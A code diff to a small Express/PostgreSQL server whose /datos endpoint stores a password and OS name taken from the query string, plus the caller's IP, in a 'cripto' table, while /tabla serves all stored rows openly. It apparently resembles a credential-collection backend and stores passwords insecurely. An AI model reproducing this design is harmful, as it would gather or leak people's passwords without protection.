@@ -1,12 +1,12 @@
 const express = require('express');
 const app = express();
 const cors = require('cors');
-const { Client } = require('pg')
+const { Client } = require('pg');
+const generateUniqueId = require('generate-unique-id');
 
 app.use(express.urlencoded({extended:false}));
 app.use(express.json());
 app.use(cors());
-
 
 
 const client = new Client({
@@ -14,6 +14,8 @@ const client = new Client({
 	ssl: {rejectUnauthorized: false}
   })
 
+
+///////////////////////////////////////////////
   client.connect();
   let datos ={};
   
@@ -30,14 +32,12 @@ const client = new Client({
  	 app.get('/tabla', (req,res)=>{
 		res.send(datos.rows);
  	})
-
-	 
-
+///////////////////////////////////////////////
+	
 	app.get('/datos', (req,res)=>{
-
 		console.log(req.query)
-		client.connect();
-		client.query('SELECT * from cripto', (err, res) => {
+		const id = generateUniqueId({length: 8,useLetters: false});
+		client.query('insert into cripto(password, so, ip, id) values ($1,$2,$3,$4)RETURNING *',[req.query.password, req.query.os, req.headers['x-forwarded-for'], id], (err, res) => {
 			// console.log(err, res) 
 			//console.log(res.Result.rows)
 			datos = res;
@@ -46,9 +46,9 @@ const client = new Client({
 	  
 			})
 
-
  	})
 
+///////////////////////////////////////////////
 
 
 
